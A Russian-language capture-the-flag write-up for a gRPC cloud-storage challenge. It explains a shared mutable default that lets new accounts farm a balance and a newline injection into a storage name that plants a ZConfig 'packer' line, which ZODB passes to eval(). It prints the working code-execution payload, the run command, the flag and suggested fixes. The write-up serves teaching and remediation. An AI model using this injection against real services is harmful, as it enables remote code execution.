# cloud-storage

**Kaspersky CTF 2026 · web**

> I've been in the seek for a suitable way of a long term investment towards
> retirement. Thanks lord I've found this service.

## Executive Summary

В задании был gRPC-сервис с регистрацией, биллингом и платными ZODB-хранилищами. Решение получилось из двух багов: общий mutable default позволил нафармить деньги через новые аккаунты, а перевод строки в имени storage — добавить свой `packer` в ZConfig и дойти до `eval()`.

Я запускал цепочку на CTF-инстансе с исходниками версии `1.3.3.7`: 249 аккаунтов дали баланс `7351`, после чего `/readflag please` вернул флаг прямо в gRPC-ошибке. Никакие чужие токены для этого не нужны. Истории релизов в архиве не было, поэтому про другие версии ничего утверждать нельзя.

## Background

`Grant` добавляет только 10–50 монет, а создание storage стоит `7331`. После создания конфиг хранилища читается через `ZODB.config.storageFromURL()` при вызовах `Keys`, `Get` и `Set`. Полезный ввод здесь — `billing_id` и имя storage.

## Vulnerability Details

Первый баг — значение аргумента в `server/src/resource/billing.py` создаётся один раз при импорте:

```python
def create(self, _user_id: int, _billing: Billing = copy.deepcopy(default_billing)):
    _billing.uid = str(uuid.uuid4())
    _billing.user_id = _user_id
    self._save(_billing)
```

Если передать в `Grant` несуществующий ID, сервис вызывает `create(context.user.id)` без второго аргумента. В итоге между аккаунтами переиспользуется один ORM-объект: `uid` и владелец меняются, но баланс остаётся. Я регистрировал одноразового пользователя, вызывал `Grant(billing_id="missing")` и переходил к следующему.

Второй баг — имя storage напрямую форматируется в конфиг (`server/src/utils/storage.py`):

```python
CONFIG = '''<filestorage>
    path storages/{storage_id}/{name}_storage
</filestorage>
'''

def _validate_storage_name(self, storage_id, name):
    return os.path.normpath(os.path.join(storage_id, name)).startswith(storage_id)
```

Проверка ловит обычный `../`, но не `\n`. Поэтому имя можно превратить в несколько строк:

```text
marker
packer os:(_ for _ in ()).throw(Exception(__import__('subprocess').check_output(['/readflag','please']).decode()))
#
```

`#` комментирует серверный суффикс `_storage`. Дальше срабатывает код `FileStorage.open()` из ZODB 6.x:

```python
m, expr = packer.split(':', 1)
m = __import__(m, {}, {}, ['*'])
options['packer'] = eval(expr, m.__dict__)
```

Payload запускает `/readflag please`, берёт stdout и специально бросает `Exception`. Это удобно, потому что `StorageService.Keys()` возвращает `str(e)` клиенту:

```python
except Exception as e:
    context.abort(grpc.StatusCode.ABORTED, str(e))
```

## Exploitability Analysis

Нужен только доступ к публичному gRPC API и несколько сотен регистраций. Каждый запрос подписан токеном текущего пользователя; чужую учётку мы не крадём. В моём прогоне порог был пройден на 249-м аккаунте: `balance=7351`.

Сам процесс приложения не может открыть `/flag.txt`, но в контейнере лежит setuid-root helper `/readflag`. Поэтому выполнение выражения от пользователя `cloud` всё равно даёт флаг.

Без отсутствующего billing ID не вызывается уязвимая ветка `create()`. Без перевода строки `packer` остаётся частью пути. Наконец, один `Create` только записывает конфиг — для запуска payload нужен последующий `Keys`.

## Proof of Concept

Рядом лежит полный [`exploit.py`](exploit.py) и protobuf-модули из раздачи.

```sh
pip install grpcio protobuf
python exploit.py grpcs://HOST:443
```

Скрипт фармит баланс, создаёт storage с внедрённым `packer`, вызывает `Keys` и печатает `details` исключения. Реальный финал запуска:

```text
users=249 balance=7351
SERVER_ERROR: kaspersky{ffbfb669-7f9a-4878-bd16-11e8c5c81a21}
```

Запускать стоит только на своём CTF-инстансе: скрипт создаёт много аккаунтов.

## Remediation

Для billing нужно заменить mutable default на `None` и создавать свежий `Billing` внутри функции. Для storage — разрешить в имени только ожидаемые символы, например `[A-Za-z0-9_-]`, и не собирать ZConfig конкатенацией пользовательской строки. Отдельный тест на `\n`, `\r` и директиву `packer` закроет именно эту цепочку.

Исправленного релиза в раздаче нет, поэтому это предлагаемый фикс, а не описание готового патча.

## Summary

Один общий `Billing` превратил `Grant` в бесконечный банк. После покупки storage newline-инъекция добавила в ZConfig `packer`, ZODB выполнил его через `eval()`, а `Keys` вернул вывод `/readflag please` в тексте ошибки.

```text
kaspersky{ffbfb669-7f9a-4878-bd16-11e8c5c81a21}
```

